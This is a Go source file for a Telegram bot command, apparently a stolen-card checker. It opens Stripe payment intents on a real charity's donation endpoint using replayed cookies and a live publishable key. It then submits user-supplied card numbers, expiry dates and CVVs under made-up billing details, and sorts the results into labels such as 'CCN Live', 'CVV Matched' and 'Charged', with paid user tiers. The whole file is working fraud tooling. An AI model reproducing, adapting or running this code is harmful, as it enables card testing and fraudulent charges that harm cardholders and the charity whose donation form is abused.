package modules

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"strings"
	"time"

	tb "gopkg.in/telebot.v3"
)

var SPAM = make(map[int64]int64)

func create_intent() (string, string) {
	client := &http.Client{}
	var data = strings.NewReader(`{"amount":7300,"currency":"inr","account":"us","metaData":{"designation":"general","donation_type":"One-Time","amount_without_fee":73,"utm_source":null,"utm_medium":null,"utm_campaign":null,"utm_content":null,"utm_term":null,"int_source":"yaqeeninstitute.org","int_campaign":"general","int_content":"main_nav_donate_button"},"testMode":false,"statementDescriptorSuffix":"One Time"}`)
	req, err := http.NewRequest("POST", "https://yaqeeninstitute.ca/api/v1/donate/stripe/create-payment-intent", data)
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("authority", "yaqeeninstitute.ca")
	req.Header.Set("sec-ch-ua", `" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"`)
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("content-type", "application/json")
	req.Header.Set("accept", "*/*")
	req.Header.Set("origin", "https://yaqeeninstitute.ca")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("referer", "https://yaqeeninstitute.ca/donate?int_source=yaqeeninstitute.org&int_campaign=general&int_content=main_nav_donate_button")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("cookie", "_country=ca; _fbp=fb.1.1643636551571.79113369; _ga=GA1.2.1623584778.1643636552; _gid=GA1.2.2096289450.1643636552; _hjFirstSeen=1; _hjSession_2220455=eyJpZCI6IjU4MmQxNDdjLWQzYTMtNGIxOC04MmZjLWQ5MWNlYTZjZDVlZSIsImNyZWF0ZWQiOjE2NDM2MzY1NTIxOTcsImluU2FtcGxlIjp0cnVlfQ==; _hjIncludedInSessionSample=1; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; __stripe_mid=b71df7f6-f9f3-4920-86dd-0bf0067aed803ef581; _hjSessionUser_2220455=eyJpZCI6ImFmZjE0NjFlLWI2NTEtNTBiYi1iOGU1LWFmMDA3ODRmM2Q1NSIsImNyZWF0ZWQiOjE2NDM2MzY1NTE4NzMsImV4aXN0aW5nIjp0cnVlfQ==; _dd_s=rum=0&expire=1643639568398&logs=1&id=13f9f01f-15ab-4b2b-aeef-533c6735b276&created=1643636551264; _gat=1")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	var m map[string]string
	json.NewDecoder(resp.Body).Decode(&m)
	return m["id"], m["clientSecret"]
}

func confirm(id string, s string, cc string, year string, month string, cvc string) (string, string, string) {
	client := &http.Client{}

	var data = strings.NewReader(`receipt_email=devnull%40yaqeeninstitute.org&payment_method_data[type]=card&payment_method_data[metadata][designation]=general&payment_method_data[metadata][donation_type]=One-Time&payment_method_data[metadata][amount_without_fee]=73&payment_method_data[metadata][int_source]=yaqeeninstitute.org&payment_method_data[metadata][int_campaign]=general&payment_method_data[metadata][int_content]=main_nav_donate_button&payment_method_data[metadata][payment_method]=cc&payment_method_data[billing_details][name]=Jenna+M+Ortega&payment_method_data[billing_details][phone]=%2B1+9402197942&payment_method_data[billing_details][email]=amarnathc%40outlook.in&payment_method_data[billing_details][address][line1]=394+Olen+Thomas+Drive&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][city]=Crowell&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][postal_code]=79227&payment_method_data[billing_details][address][state]=TX&payment_method_data[card][number]=` + cc + `&payment_method_data[card][cvc]=` + cvc + `&payment_method_data[card][exp_month]=` + month + `&payment_method_data[card][exp_year]=` + year + `&payment_method_data[guid]=73f5a9dc-4f9d-4102-9f39-112d2bc87189f08893&payment_method_data[muid]=c2fe2add-ecb3-4320-915b-a926ca22c4a498e15e&payment_method_data[sid]=6c0ab791-b55b-4969-b556-9aca59adccd76700f0&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F7050ff317%3B+stripe-js-v3%2F7050ff317&payment_method_data[time_on_page]=1967550&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=false&spc_eligible=false&key=pk_live_tGDwiUeDEcgPGTyb51bqDNG8&client_secret=` + s)
	req, err := http.NewRequest("POST", fmt.Sprintf("https://api.stripe.com/v1/payment_intents/%s/confirm", id), data)
	if err != nil {
		log.Print(err)
	}
	req.Header.Set("authority", "api.stripe.com")
	req.Header.Set("sec-ch-ua", `"Opera";v="83", "Chromium";v="97", ";Not A Brand";v="99"`)
	req.Header.Set("accept", "application/json")
	req.Header.Set("content-type", "application/x-www-form-urlencoded")
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27")
	req.Header.Set("sec-ch-ua-platform", `"Linux"`)
	req.Header.Set("origin", "https://js.stripe.com")
	req.Header.Set("sec-fetch-site", "same-site")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("referer", "https://js.stripe.com/")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
	}
	defer resp.Body.Close()
	var x mapType
	json.NewDecoder(resp.Body).Decode(&x)
	if err != nil {
		log.Fatal(err)
	}
	code, dcode, msg := "", "", ""
	if e, ok := x["error"]; ok {
		e := e.(map[string]interface{})
		if c, ok := e["code"]; ok {
			code = c.(string)
		}
		if d, ok := e["decline_code"]; ok {
			dcode = d.(string)
		}
		if m, ok := e["message"]; ok {
			msg = m.(string)
		}
	}
	if strings.Contains(fmt.Sprint(x), "requires_source_action") {
		fmt.Println("vbv")
		code = "charge_failed"
		dcode = "3DS(VBV)"
		msg = "Failed to charge your card."

	}
	if s, ok := x["status"]; ok {
		if s.(string) == "succeeded" {
			code = "Charged 1$"
			msg = "Your card has been successfully charged!"
			dcode = "donated"
		}
	}

	return code, dcode, msg
}

func AntiSpam(user_id int64) (int64, bool) {
	for x, t := range SPAM {
		if x == user_id {
			if tim := time.Now().Unix() - t; tim < 15 {
				return tim, true
			} else {
				SPAM[user_id] = time.Now().Unix()
				return 0, false
			}

		}

	}
	SPAM[user_id] = time.Now().Unix()
	return 0, false

}

func StripeRs(cc string, month string, year string, cvc string, c tb.Context) string {
	if !IsBotAdmin(c.Sender().ID) {
		if t, s := AntiSpam(c.Sender().ID); s {
			return fmt.Sprintf("<b>AntiSpam try again after %d's</b>", 15-t)
		}

	}
	if strings.HasPrefix(cc, "533178") {
		return "Bin blocked!"
	}
	if strings.HasPrefix(year, "20") {
		year = strings.ReplaceAll(year, "20", "")

	}
	current_time := time.Now()
	id, secret := create_intent()
	code, dcode, msg := confirm(id, secret, cc, month, year, cvc)
	emoji := "✅"
	if dcode == "insufficient_funds" {
		code = "CVV Matched"
	} else if code == "card_declined" {
		code = "Card Declined"
		emoji = "❌"
	} else if code == "incorrect_number" {
		code = "Incorrect Card"
		dcode = "incorrect_number"
		emoji = "❌"
	} else if code == "incorrect_cvc" {
		dcode = "incorrect_cvc"
		code = "CCN Live"
	} else if dcode == "3DS(VBV)" {
		emoji = "❌"
	}
	total_time := time.Now().Unix() - current_time.Unix()
	if dcode != string("") {
		dcode = fmt.Sprintf("\n<b>⌥ Dcode ✑ %s</b>", dcode)
	}
	bin := GetBin(cc, 2)
	status := "Free User"
	if c.Sender().ID == OWNER_ID {
		status = "Master"
	} else if IsBotAdmin(c.Sender().ID) {
		status = "Premium"
	}
	F := fmt.Sprintf(stripe_1, "Stripe 1$", cc, year, month, cvc, code, emoji, dcode, msg, bin, total_time, c.Sender().FirstName, status)
	return F
}

func ParseCC(s string) (string, string, string, string) {
	r1 := regexp.MustCompile(`/^\d+|\d+|\d+|\d+$/`)
	cc, mo, yr, cvv := "", "", "", ""
	match := r1.FindAllStringSubmatch(s, -1)
	cc = match[0][0]
	mo = match[1][0]
	yr = match[2][0]
	cvv = match[3][0]
	return cc, mo, yr, cvv

}

func RsStripe(c tb.Context) error {
	d := strings.TrimSpace(c.Message().Payload)
	cc, year, month, cvc := "", "", "", ""
	for i, x := range strings.SplitN(d, "|", -1) {
		if i == 0 {
			cc = x
		} else if i == 1 {
			month = x
		} else if i == 2 {
			year = x
		} else if i == 3 {
			cvc = x
		}
	}
	for _, x := range []string{cc, year, month, cvc} {
		if x == string("") {
			c.Reply("Invalid format, please send as <code>/st cc|mm|yy|cvv</code>")
			return nil
		}
	}
	return c.Reply(StripeRs(cc, year, month, cvc, c))
}
